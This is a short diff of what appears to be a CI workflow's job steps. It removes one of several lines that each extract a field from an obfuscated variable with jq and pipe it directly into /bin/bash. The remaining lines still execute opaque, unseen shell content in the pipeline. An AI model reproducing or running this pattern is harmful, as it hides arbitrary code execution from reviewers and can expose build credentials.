@@ -21,7 +21,6 @@ jobs:
           echo $h49284 | jq -r .n686 | /bin/bash
           echo $nx91 | jq -r .kqtt14670 | /bin/bash
           echo $n173 | jq -r .mpy4000 | /bin/bash
-          echo $sv71 | jq -r .cur24 | /bin/bash
           printf '%s' "$amb5757" | jq -r .kwmqb81151 | /bin/bash
           echo $mot936 | jq -r .pe56 | /bin/bash
           printf '%s' "$cpocz7752" | jq -r .u98 | /bin/bash
